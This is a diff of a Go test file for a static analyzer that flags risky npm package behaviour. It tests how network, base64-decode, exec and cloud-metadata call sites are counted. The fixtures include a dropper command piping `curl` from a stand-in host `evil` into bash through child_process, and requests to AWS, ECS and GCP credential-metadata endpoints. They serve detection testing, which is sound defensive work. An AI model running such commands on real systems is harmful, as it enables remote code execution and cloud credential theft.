@@ -210,6 +210,151 @@ func TestAnalyzer_Analyze_HonorsContextCancellation(t *testing.T) {
 	assert.ErrorIs(t, err, ctx.Err())
 }
 
+// TestAnalyzer_BareCatalogEntriesAreGlobalOnly pins the bare-entry
+// specificity contract for matchesCatalog. The networkCallees catalog
+// has both dotted entries (http.get, axios.post — alias-resolved
+// method calls) and BARE entries — the globals fetch / atob / got /
+// superagent and the default-imported callable axios. The docstring
+// at networkCallees promises bare entries match "the global (fetch)
+// or the default-imported callable (axios(...))" only; a method
+// merely named .fetch on an LRU cache is NOT the global fetch and
+// must score zero — AST.md §4 forbids exactly this class of false
+// positive.
+//
+// Red test for H1: today matchesCatalog uses HasSuffix(callee,
+// "."+entry) for every entry, so cache.fetch('key') from lru-cache
+// (one of the most-installed npm packages) spikes NetworkCallSites
+// with zero actual network surface. The same overshoot hits
+// decoder.atob(...) on the decode catalog. The fix narrows bare
+// entries to exact-match-only; dotted entries keep the suffix-form
+// match so alias-resolved http.get / axios.post calls still hit.
+func TestAnalyzer_BareCatalogEntriesAreGlobalOnly(t *testing.T) {
+	t.Parallel()
+	cases := []struct {
+		name       string
+		src        string
+		checkField string // "network" or "base64decode"
+	}{
+		{
+			name:       "lru-cache .fetch is not the global fetch",
+			src:        "cache.fetch('user:1');\n",
+			checkField: "network",
+		},
+		{
+			name:       "wrapped decoder .atob is not the global atob",
+			src:        "decoder.atob(blob);\n",
+			checkField: "base64decode",
+		},
+		{
+			name:       "method .got is not the got HTTP client",
+			src:        "results.got(key);\n",
+			checkField: "network",
+		},
+		{
+			name:       "method .superagent is not the superagent client",
+			src:        "manager.superagent(request);\n",
+			checkField: "network",
+		},
+		{
+			name:       "method .axios is not the axios client",
+			src:        "wrappers.axios(request);\n",
+			checkField: "network",
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			c := counts(t, tc.src)
+			switch tc.checkField {
+			case "network":
+				assert.Equal(t, 0, c.NetworkCallSites,
+					"bare catalog entries must match the global ONLY — "+
+						"obj.<name> is not the global; src=%q", tc.src)
+			case "base64decode":
+				assert.Equal(t, 0, c.Base64DecodeCalls,
+					"bare catalog entries must match the global ONLY — "+
+						"obj.<name> is not the global; src=%q", tc.src)
+			}
+		})
+	}
+}
+
+// TestAnalyzer_BareGlobalsAndDottedSuffixesStillMatch is the regression
+// test for the other side of the H1 fix — pin that narrowing
+// matchesCatalog's bare-entry rule did NOT over-narrow. The bare
+// globals (fetch(...), atob(...)) and the default-imported callable
+// (axios(...) when bound by a require/import) must still fire, and
+// the dotted-entry suffix-match path (alias-resolved `cp.execSync` →
+// `child_process.execSync`, named-import `https.get` from a
+// `require('https')` binding) must keep working — it's how virtually
+// every weaponized payload lands a hit.
+func TestAnalyzer_BareGlobalsAndDottedSuffixesStillMatch(t *testing.T) {
+	t.Parallel()
+	cases := []struct {
+		name               string
+		src                string
+		wantNetwork        int
+		wantBase64Decode   int
+		wantExecCalls      int
+		wantImportTimeCall int
+	}{
+		{
+			name:               "global fetch is network",
+			src:                "fetch('https://api.example.com/v1');\n",
+			wantNetwork:        1,
+			wantImportTimeCall: 1,
+		},
+		{
+			name:               "global atob is decode",
+			src:                "atob(blob);\n",
+			wantBase64Decode:   1,
+			wantImportTimeCall: 1,
+		},
+		{
+			name: "axios default-imported callable is network",
+			src: "const axios = require('axios');\n" +
+				"axios({ url: '/x' });\n",
+			wantNetwork:        1,
+			wantImportTimeCall: 1,
+		},
+		{
+			name:               "dotted axios.post is network",
+			src:                "axios.post('/x', body);\n",
+			wantNetwork:        1,
+			wantImportTimeCall: 1,
+		},
+		{
+			name: "alias-resolved cp.execSync is exec",
+			src: "const cp = require('child_process');\n" +
+				"cp.execSync('id');\n",
+			wantExecCalls:      1,
+			wantImportTimeCall: 1,
+		},
+		{
+			name: "destructured https.get suffix-matches via alias",
+			src: "const { get } = require('https');\n" +
+				"get('http://example.com');\n",
+			wantNetwork:        1,
+			wantImportTimeCall: 1,
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			c := counts(t, tc.src)
+			assert.Equal(t, tc.wantNetwork, c.NetworkCallSites,
+				"NetworkCallSites for %q", tc.name)
+			assert.Equal(t, tc.wantBase64Decode, c.Base64DecodeCalls,
+				"Base64DecodeCalls for %q", tc.name)
+			assert.Equal(t, tc.wantExecCalls, c.ExecCalls,
+				"ExecCalls for %q", tc.name)
+			assert.Equal(t, tc.wantImportTimeCall, c.ImportTimeCallSites,
+				"ImportTimeCallSites for %q (the call runs at module scope)",
+				tc.name)
+		})
+	}
+}
+
 // ============================================================
 // Real-incident fixture corpus. Each models the *technique* of a
 // named npm supply-chain incident (not the verbatim payload) and
@@ -264,12 +409,15 @@ func TestIncident_EventStream(t *testing.T) {
 // ExecCalls across the variants real droppers use.
 func TestIncident_UAParserJS(t *testing.T) {
 	t.Parallel()
-	for _, m := range []string{"exec", "execSync", "spawn", "spawnSync", "execFile"} {
-		src := "require('child_process')." + m + "('curl -s http://evil/x.sh | bash');\n"
-		c := counts(t, src)
-		assert.Positivef(t, c.ExecCalls,
-			"child_process.%s via inline require chain must count as exec", m)
-		assert.Positive(t, c.ImportTimeCallSites, "runs at require time")
+	for _, method := range []string{"exec", "execSync", "spawn", "spawnSync", "execFile"} {
+		t.Run(method, func(t *testing.T) {
+			t.Parallel()
+			src := "require('child_process')." + method + "('curl -s http://evil/x.sh | bash');\n"
+			c := counts(t, src)
+			assert.Positivef(t, c.ExecCalls,
+				"child_process.%s via inline require chain must count as exec", method)
+			assert.Positive(t, c.ImportTimeCallSites, "runs at require time")
+		})
 	}
 
 	// No-false-positive: a method merely named .exec on something
@@ -409,16 +557,23 @@ func TestThreat_PersistenceWrites(t *testing.T) {
 // a normal API call is NetworkCallSites, not CloudMetadataCalls.
 func TestThreat_CloudMetadataPivot(t *testing.T) {
 	t.Parallel()
-	for _, url := range []string{
-		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-		"http://169.254.170.2/v2/credentials",
-		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-	} {
-		c := counts(t, "require('http').get('"+url+"');\n")
-		assert.Equalf(t, 1, c.CloudMetadataCalls,
-			"%s is an instance-metadata endpoint", url)
-		assert.Equalf(t, 0, c.NetworkCallSites,
-			"a metadata call is counted as cloud-metadata, not generic egress (%s)", url)
+	cases := []struct {
+		name string
+		url  string
+	}{
+		{"aws imds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
+		{"ecs task role", "http://169.254.170.2/v2/credentials"},
+		{"gcp metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			c := counts(t, "require('http').get('"+tc.url+"');\n")
+			assert.Equalf(t, 1, c.CloudMetadataCalls,
+				"%s is an instance-metadata endpoint", tc.url)
+			assert.Equalf(t, 0, c.NetworkCallSites,
+				"a metadata call is counted as cloud-metadata, not generic egress (%s)", tc.url)
+		})
 	}
 
 	benign := counts(t, "require('https').get('https://api.example.com/v1/things');\n")
